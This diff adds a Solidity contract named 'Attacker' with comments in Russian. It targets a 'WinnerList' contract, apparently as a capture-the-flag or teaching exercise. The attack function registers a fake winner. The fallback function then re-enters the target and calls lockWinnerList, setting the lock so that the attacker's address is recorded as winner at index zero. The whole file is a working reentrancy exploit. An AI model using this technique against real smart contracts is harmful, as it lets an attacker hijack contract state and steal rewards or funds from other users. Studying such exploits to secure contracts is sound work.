@@ -1,0 +1,34 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+// создаем интерфейс
+
+interface IWinnerList {
+    function addWinner(address winner) external;
+    function lockWinnerList() external;
+}
+
+contract Attacker {
+    IWinnerList public target;
+    address public fakeWinner;
+    
+// в конструкторе указываем атакуемый контракт и фейк победителя
+    constructor(address _target, address _fakeWinner) {
+        target = IWinnerList(_target);
+        fakeWinner = _fakeWinner;
+    }
+// активизируем функцию addWinner
+    function attack() public {
+       
+        target.addWinner(fakeWinner); 
+       
+    }
+//не даем завершиться функции addWinner ( так как в контракте WinnerList идет обращение к fallback через call)
+//и через fallback запускаем функцию lockWinnerList и меняем переменную lock на true
+//тем самым завершаем функцию addWinner и записываем победителя в Массив под нулевым номером
+    fallback() external {
+     
+        target.lockWinnerList();
+        }
+        }
+    
